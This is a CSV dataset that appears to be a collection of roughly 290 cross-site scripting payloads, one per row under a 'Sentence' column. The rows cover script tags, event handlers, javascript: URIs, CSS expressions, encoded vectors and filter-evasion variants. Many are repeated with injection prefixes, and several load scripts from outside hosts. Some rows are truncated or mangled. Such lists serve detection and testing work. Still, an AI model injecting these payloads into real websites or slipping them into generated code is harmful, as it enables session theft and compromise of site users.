,Sentence
0,confirm(2)>/
1,open()>
2,location=?javascript:alert(1)>click
3,<svg><script>alert(/1/)</script>
4,</script><script>alert(1)</script>
5,5rt(0);'>rhainfosec
6,">""<img src=&{document.cookie=true;};>"
7,">""<img src=""mocha:document.cookie=true;"">"
8,">""<img src=""livescript:document.cookie=true;"">"
9,"""data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4="">"
10,prompt(1);>
11,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""crosssitescripting"")>"
12,<iframe src=http://vulnerability-lab.com/index.html <
13,"<table background=""javascript:alert('crosssitescripting')"">"
14,"<table><td background=""javascript:alert('crosssitescripting')"">"
15,"<bgsound src=""javascript:alert('crosssitescripting');"">"
16,"<br size=""&{alert('crosssitescripting')}"">"
17,"<a href=""http://server.com/"">crosssitescripting</a>"
18,"<a href=""http://www.google.com"">crosssitescripting</a>"
19,"<a href=""http://1113982867/"">crosssitescripting</a>"
20,"<a href=""javascript:document.location='http://www.vulnerability-lab.com/'"">crosssitescripting</a>"
21,"<base href=""javascript:alert('crosssitescripting');//"">"
22,""";alert('crosssitescripting');//"
23,"<input type=""image"" src=""javascript:alert('crosssitescripting');"">"
24,"<crosssitescripting style=""behavior: url(crosssitescripting.htc);"">"
25,scriptalert(crosssitescripting)/script
26,"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))"">"
27,"<crosssitescripting style=""crosssitescripting:expression(alert('crosssitescripting'))""> exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*""); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(""crosssitescripting""))'>"
28,"<html xmlns:crosssitescripting><?import namespace=""crosssitescripting"" implementation=""http://ha.ckers.org/crosssitescripting.htc""><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>"
29,"<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('crosssitescripting');"">]]>"
30,</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
31,"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:alert('crosssitescripting')""></b></i></xml>"
32,"<span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
33,"<xml src=""crosssitescriptingtest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>"
34,"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">"
35,"<?import namespace=""t"" implementation=""#default#time2"">"
36,"<t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>alert(""crosssitescripting"")</script>"">"
37,</body></html>
38,"<script src=""http://vulnerability-lab.com/crosssitescripting.jpg""></script>"
39,"<? echo('<scr)';echo('ipt>alert(""crosssitescripting"")</script>'); ?>"
40,"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">"
41,<iframe src=http://test.de>
42,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""xss"")>"
43,><img id=xss src=x onerror=alert(xss);>
44,";!--""<xss>=&{()}"""
45,"<img id=xss src=""javascript:alert('xss');"">"
46,<img id=xss src=javascript:alert('xss')>
47,"<img id=xss src=javascript:alert(""xss"")>"
48,"<img id=xss src=`javascript:alert(""'xss'"")`>"
49,"<img id=xss src=""jav ascript:alert('xss');"">"
50,"<img id=xss src=javascript:alert(""xss"")>"";' >"
51,"<img id=xss src="" javascript:alert('xss');"">"
52,"<<script>alert(""xss"");//<</script>"
53,""";alert('xss');//"
54,<img id=xss src='javascript:alert('xss')
55,<script>alert(/xss/.source)</script>
56,"<body background=""javascript:alert('xss')"">"
57,"</title><script>alert(""xss"");</script>"
58,"<input type=""image"" id=xss src=""javascript:alert('xss');"">"
59,<script>alert('xssya')</script>
60,"<script>alert(""xssya"")</script>"
61,1<script>prompt(999691)</script>
62,//1<script>prompt(919397)</script>
63,"""<script>alert('xssya')</script>"
64,"'""</script><script>alert('xssya')</script>"
65,1<script >prompt(962477)</script>
66,<script>alert(1);</script>
67,"""><script>alert('xssya')</script>"
68,"'';!--""<xss>=&{()}"
69,alert(1)>
70,""";alert(1)//"
71,<script>alert('xssya');</script>
72,"'""--></style></script><script>alert('xss')</script>"
73,<scr<script>ipt>alert(1)</scr<script>ipt>
74,javascript:alert(1)//
75,<script>confirm(0);</script>
76,"""x:alert"" onerror=""eval(src+'(0)')"">"
77,"data:text/html,<script>alert(0)</script>"
78,<body/onhashchange=alert(1)><a+href=#>clickit
79,<img+src=x+onerror=prompt(1);>
80,<video+src=x+onerror=prompt(1);>
81,"""javascript:alert(2)"">"
82,""";alert('xss)//"
83,"<img """"""><script>alert(""xss"")</script>"">"
84,x onfocus=alert(1)>
85,"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">"
86,"""javascript:alert(1)""><input type=submit>"
87,"data:text/html, type=image>"
88,<isindex action=j a vas c r ipt:alert(1) type=image>
89,confirm(2)>
90,"""http://www.google.com./"">xss</a>"
91,"""test""></form><button form=""test"" formaction=""javascript:alert(1)"">x</button>"
92,write(1) autofocus>
93,write(1) autofocus><input autofocus>
94,javascript:alert(1)//></video>
95,alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
96,test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>
97,"""alert(1)"">"
98,"""alert(1)""><source></source></video>"
99,"""javascript:alert(1)"">x</button>"
100,alert(1)><input autofocus>
101,"""javascript:alert(1)"">clickme</math>"
102,"""import"" href=""test.svg"" />"
103,"<iframe srcdoc=""<img src=x:x onerror=alert(1)>"" />"
104,"""x""><img onerror=""alert(1)""></picture>"
105,"""x"" onerror=""alert(1)""></picture>"
106,""",,,,,x"" onerror=""alert(1)"">"
107,"""javascript:alert(1)""></table>"
108,"""--><img src=x onerror=alert(1)//"">"
109,"""</comment><img src=x onerror=alert(1)//"">"
110,"""</style><img src=x onerror=alert(1)//"">"
111,list-style:url() onerror=alert(1)></li>
112,"content:url(data:image/svg+xml,<svg/>);visibility:hidden onload=alert(1)></div>"
113,"""javascript://""/></head><body><a href=""/. /,alert(1)//"
114,"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></object>"
115,"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></embed>"
116,<b <script>alert(1)//</script>0</script></b>
117,"""div1""><input value=""``onmouseover=alert(1)""></div> <div id=""div2""></div>"
118,"document.getelementbyid(""div1"").innerhtml;</script>"
119,width:1px;filter:glow onfilterchange=alert(1)>x</div>
120,mhtml:http://html5sec.org/test.html!xss.html></iframe>
121,"""x` `<script>alert(1)</script>""` `>"
122,"alt=alert(1)//"">"
123,alert(1)></title><title title=></title>
124,xx:xx onerror=alert(1)//--!>
125,"""-o-link:'javascript:alert(1)';-o-link-source:current"">x</a>"
126,"<style>@import ""data:,*{x:expression(write(1))}"";</style>"
127,x:expression8write(1)9>
128,"$,_=1}}).$=alert</script>"
129,"<script>referenceerror.prototype.__definegetter__('name', function(){alert(1)}),x</script>"
130,"function,[{}][0].constructor._('alert(1)')()</script>"
131,"""#"">{alert(1)}</script>;1"
132,<b><script<b></b><alert(1)</script </b></b>
133,"<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
134,"<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
135,<script>document.cookie=true;</script>
136,"<img src=""jav ascript:document.cookie=true;"">"
137,"<img src=""javascript:document.cookie=true;"">"
138,"<img src="" javascript:document.cookie=true;"">"
139,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
140,<script>document.cookie=true;//<</script>
141,<script <b>document.cookie=true;</script>
142,"<iframe src=""javascript:document.cookie=true;>"
143,<script>a=/crosssitescripting/ document.cookie=true;</script>
144,</title><script>document.cookie=true;</script>
145,"<input type=""image"" src=""javascript:document.cookie=true;"">"
146,"<body background=""javascript:document.cookie=true;"">"
147,<body onload=document.cookie=true;>
148,"<img dynsrc=""javascript:document.cookie=true;"">"
149,"<img lowsrc=""javascript:document.cookie=true;"">"
150,"<bgsound src=""javascript:document.cookie=true;"">"
151,"<br size=""&{document.cookie=true}"">"
152,"<layer src=""javascript:document.cookie=true;""></layer>"
153,"<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
154,"<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
155,scriptdocument.cookie=true;/script
156,"<iframe src=""javascript:document.cookie=true;""></iframe>"
157,"<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
158,"<table background=""javascript:document.cookie=true;"">"
159,"<table><td background=""javascript:document.cookie=true;"">"
160,"<div style=""background-image: url(javascript:document.cookie=true;)"">"
161,"<div style=""width: expression(document.cookie=true);"">"
162,<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
163,"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">"
164,"<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">"
165,"exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>"
166,"<style type=""text/javascript"">document.cookie=true;</style>"
167,<body onload=alert('xss')>
168,"<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>"
169,"<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>"
170,"<base href=""javascript:document.cookie=true;//"">"
171,<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
172,"<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>"
173,"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
174,"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>"
175,<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
176,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-"
177,"<a href=""javascript#document.cookie=true;"">"
178,"<div onmouseover=""document.cookie=true;"">"
179,"<input type=""image"" dynsrc=""javascript:document.cookie=true;"">"
180,&<script>document.cookie=true;</script>
181,&{document.cookie=true;};
182,<img src=&{document.cookie=true;};>
183,"<img src=""mocha:document.cookie=true;"">"
184,"<img src=""livescript:document.cookie=true;"">"
185,"<a href=""about:<script>document.cookie=true;</script>"">"
186,"<body onload=""document.cookie=true;"">"
187,"<div style=""background-image: url(javascript:document.cookie=true;);"">"
188,"<div style=""behaviour: url([link to code]);"">"
189,"<div style=""binding: url([link to code]);"">"
190,"<div style=""width: expression(document.cookie=true;);"">"
191,"<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">"
192,<style><!--</style><script>document.cookie=true;//--></script>
193,<<script>document.cookie=true;</script>
194,<script>document.cookie=true;//--></script>
195,<!-- -- --><script>document.cookie=true;</script><!-- -- -->
196,"<img src=""blah""onmouseover=""document.cookie=true;"">"
197,"<img src=""blah>"" onmouseover=""document.cookie=true;"">"
198,"<xml src=""javascript:document.cookie=true;"">"
199,"<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>"
200,"<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>"
201,">""<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
202,">""<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
203,">""<script>document.cookie=true;</script>"
204,">""<img src=""jav ascript:document.cookie=true;"">"
205,">""<img src=""javascript:document.cookie=true;"">"
206,">""<img src="" javascript:document.cookie=true;"">"
207,">""<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
208,">""<script>document.cookie=true;//<</script>"
209,">""<script <b>document.cookie=true;</script>"
210,">""<iframe src=""javascript:document.cookie=true;>"
211,">""<script>a=/crosssitescripting/ document.cookie=true;</script>"
212,">""</title><script>document.cookie=true;</script>"
213,">""<input type=""image"" src=""javascript:document.cookie=true;"">"
214,">""<body background=""javascript:document.cookie=true;"">"
215,">""<body onload=document.cookie=true;>"
216,">""<img dynsrc=""javascript:document.cookie=true;"">"
217,">""<img lowsrc=""javascript:document.cookie=true;"">"
218,">""<bgsound src=""javascript:document.cookie=true;"">"
219,">""<br size=""&{document.cookie=true}"">"
220,">""<layer src=""javascript:document.cookie=true;""></layer>"
221,">""<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
222,">""<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
223,">""scriptdocument.cookie=true;/script"
224,">""<iframe src=""javascript:document.cookie=true;""></iframe>"
225,">""<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
226,">""<table background=""javascript:document.cookie=true;"">"
227,">""<table><td background=""javascript:document.cookie=true;"">"
228,">""<div style=""background-image: url(javascript:document.cookie=true;)"">"
229,">""<div style=""width: expression(document.cookie=true);"">"
230,">""<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>"
231,">""<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">"
232,">""<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">"
233,">""exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>"
234,">""<style type=""text/javascript"">document.cookie=true;</style>"
235,">""<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>"
236,">""<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>"
237,">""<base href=""javascript:document.cookie=true;//"">"
238,">""<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>"
239,">""<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>"
240,">""<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
241,">""<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>"
242,">""<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>"
243,">""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-"
244,">""<a href=""javascript#document.cookie=true;"">"
245,">""<div onmouseover=""document.cookie=true;"">"
246,">""<input type=""image"" dynsrc=""javascript:document.cookie=true;"">"
247,">""&<script>document.cookie=true;</script>"
248,">""&{document.cookie=true;};"
249,">""<a href=""about:<script>document.cookie=true;</script>"">"
250,">""<body onload=""document.cookie=true;"">"
251,">""<div style=""background-image: url(javascript:document.cookie=true;);"">"
252,">""<div style=""behaviour: url([link to code]);"">"
253,">""<div style=""binding: url([link to code]);"">"
254,">""<div style=""width: expression(document.cookie=true;);"">"
255,">""<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">"
256,">""<style><!--</style><script>document.cookie=true;//--></script>"
257,">""<<script>document.cookie=true;</script>"
258,">""<script>document.cookie=true;//--></script>"
259,">""<!-- -- --><script>document.cookie=true;</script><!-- -- -->"
260,">""<img src=""blah""onmouseover=""document.cookie=true;"">"
261,">""<img src=""blah>"" onmouseover=""document.cookie=true;"">"
262,">""<xml src=""javascript:document.cookie=true;"">"
263,">""<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>"
264,">""<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>"
265,"-1<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
266,"-1<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
267,-1<script>document.cookie=true;</script>
268,"-1<img src=""jav ascript:document.cookie=true;"">"
269,"-1<img src=""javascript:document.cookie=true;"">"
270,"-1<img src="" javascript:document.cookie=true;"">"
271,"-1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
272,-1<script>document.cookie=true;//<</script>
273,-1<script <b>document.cookie=true;</script>
274,"-1<iframe src=""javascript:document.cookie=true;>"
275,-1<script>a=/crosssitescripting/ document.cookie=true;</script>
276,-1</title><script>document.cookie=true;</script>
277,"-1<input type=""image"" src=""javascript:document.cookie=true;"">"
278,"-1<body background=""javascript:document.cookie=true;"">"
279,-1<body onload=document.cookie=true;>
280,"-1<img dynsrc=""javascript:document.cookie=true;"">"
281,"-1<img lowsrc=""javascript:document.cookie=true;"">"
282,"-1<bgsound src=""javascript:document.cookie=true;"">"
283,"-1<br size=""&{document.cookie=true}"">"
284,"-1<layer src=""javascript:document.cookie=true;""></layer>"
285,"-1<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
286,"-1<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
287,-1scriptdocument.cookie=true;/script
288,"-1<iframe src=""javascript:document.cookie=true;""></iframe>"
289,"-1<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
290,"-1<table background=""javascript:document.cookie=true;"">"
291,"-1<table><td background=""javascript:document.cookie=true;"">"
292,"-1<div style=""background-image: url(javascript:document.cookie=true;)"">"
